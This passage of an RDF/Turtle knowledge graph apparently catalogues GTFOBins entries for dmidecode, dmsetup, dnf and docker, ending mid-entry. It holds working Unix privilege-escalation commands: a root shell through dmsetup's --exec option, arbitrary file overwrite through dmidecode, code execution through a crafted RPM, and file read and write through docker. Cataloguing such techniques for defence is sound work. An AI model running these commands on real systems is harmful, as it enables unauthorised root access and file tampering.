mknd:command_dmidecode-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "dmidecode-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description """It can be used to overwrite files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode.
Generate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.

- `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.

- `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.

```
make dmiwrite
TF=$(mktemp)
echo "DATA" > $TF
./dmiwrite $TF x.dmi
```
""" ;
    d3f:uses mknd:executable_dmidecode ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_dmidecode ;
    mknd:provides mknd:function_sudo ;
    mknd:value """LFILE=file_to_write
sudo dmidecode --no-sysfs -d x.dmi --dump-bin "$LFILE"
""" .

mknd:command_dmsetup-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "dmsetup-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_dmsetup ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_dmsetup ;
    mknd:provides mknd:function_sudo ;
    mknd:value """sudo dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
sudo dmsetup ls --exec '/bin/sh -s'
""" .

mknd:command_dmsetup-suid a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "dmsetup-suid" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_dmsetup ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_dmsetup ;
    mknd:provides mknd:function_suid ;
    mknd:value """./dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
./dmsetup ls --exec '/bin/sh -p -s'
""" .

mknd:command_dnf-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "dnf-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description """It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
```
""" ;
    d3f:uses mknd:executable_dnf ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_dnf ;
    mknd:provides mknd:function_sudo ;
    mknd:value """sudo dnf install -y x-1.0-1.noarch.rpm
""" .

mknd:command_docker-file-read a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "docker-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Read a file by copying it to a temporary container and back to a new location on the host." ;
    d3f:uses mknd:executable_docker ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_docker ;
    mknd:provides mknd:function_file-read ;
    mknd:value """CONTAINER_ID="$(docker run -d alpine)"  # or existing
TF=$(mktemp)
docker cp file_to_read $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF $TF
cat $TF
""" .

mknd:command_docker-file-write a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "docker-file-write" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Write a file by copying it to a temporary container and back to the target destination on the host." ;
